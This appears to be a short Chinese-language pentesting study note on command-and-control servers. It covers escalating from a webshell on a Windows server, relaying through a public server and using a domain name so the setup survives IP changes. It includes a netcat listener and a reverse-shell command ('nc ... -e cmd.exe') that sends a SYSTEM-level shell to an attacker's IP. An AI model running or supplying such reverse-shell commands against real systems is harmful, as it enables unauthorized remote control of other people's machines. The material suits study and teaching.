



# C&C 服务器 Command and Control Server

命令和控制服务器

- 通常在做渗透测试的时候，在拿到一个 webshell 的时候，需要对服务器进行提权操作
- 如果是一台 windows 的服务器，提权的时候通常是利用本地提权漏洞的 exp 进行溢出提权，有些 exp 可以直接在后面加参数，溢出成功之后执行参数中的命令，而有的 exp 溢出成功之后是返回一个 system 权限的 cmd，这时就需要将低权限的 cmd shell 反弹回本地，



在本地执行:

```bash
# 这里使用 nc 在本地执行：
nc -vv -lp 3333
# 在本地监听一个 3333 端口等待连接，
# 假设你的电脑 IP 是公网 114.114.114.114，


# 然后在目标服务器就可以执行：
nc 114.114.114.114 3333 -e cmd.exe
# 上面的命令就可以把远程服务器的服务器权限的 cmd shell 返回到本地，
# 通过 nc 建立的这个 shell 进行通信，发送你要执行的命令，在远程服务器接收到命令之后执行并将结果返回给你，
# 这时你的本机电脑就是一个简易的 C&C 服务器
```

![Screen Shot 2020-12-02 at 02.17.42](https://i.loli.net/2020/12/02/SpczfnQ68NFYmZd.png)


本机电脑是在内网中，没有公网 IP，目标服务器也在内网，这时目标不能直接通过 IP 地址连接到你本机:

```bash
# 必须有一个公网的 IP，只有这样内网的服务器才可以访问进行连接，所以可以使用一台中转服务器，
# 中转服务器公网 IP 111.111.111.111
# 不管是目标服务器还是本机都可以访问这台中转服务器，这里中转服务器的作用就是将本地内网的主机监听的端口映射到公网 IP 的某个端口，这样目标机访问中转服务器监听的端口就相当于访问了本地监听的端口。
```

![Screen Shot 2020-12-02 at 02.22.41](https://i.loli.net/2020/12/02/KPkXMCvoUD9qgHO.png)


由于 IP 地址是随着中转服务器的变化而变化的，每次 IP 的 变化都会导致整个过程都要重新操作一次，每个命令语句都要进行修改


解决这个问题: 域名
将上面语句中的 IP 地址修改为注册的域名，然后将域名解析到的中转服务器，这样即使更换了中转服务器，也不需要更改执行过的命令。



.